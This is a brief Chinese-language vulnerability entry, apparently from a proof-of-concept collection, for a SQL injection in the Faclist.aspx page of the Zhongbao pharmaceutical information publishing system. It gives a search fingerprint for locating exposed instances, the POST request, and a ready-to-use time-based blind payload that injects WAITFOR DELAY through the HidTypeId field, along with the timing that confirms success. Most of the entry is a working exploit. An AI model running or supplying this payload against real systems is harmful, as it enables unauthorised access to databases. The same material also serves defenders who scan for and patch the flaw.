# 中宝信息发布系统Faclist.aspx存在SQL注入漏洞

中宝信息发布系统 ｜ SQL注入 ｜ —
- **指纹**：`title="医药商品信息发布系统"`
- **请求**：`POST /Factory/Faclist.aspx?id=2 HTTP/1.1`

**Payload**
```
ToolkitｓｃｒｉｐｔManager1=UpdatePanel2btnok&ToolkitｓｃｒｉｐｔManager1_HiddenField=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&__VIEWSTATEGENERATOR=&txtname=&pageno=&HidTypeId=2';WAITFOR DELAY '0:0:3' --&btnok=
```
- **响应特征**：200 响应时间>=5s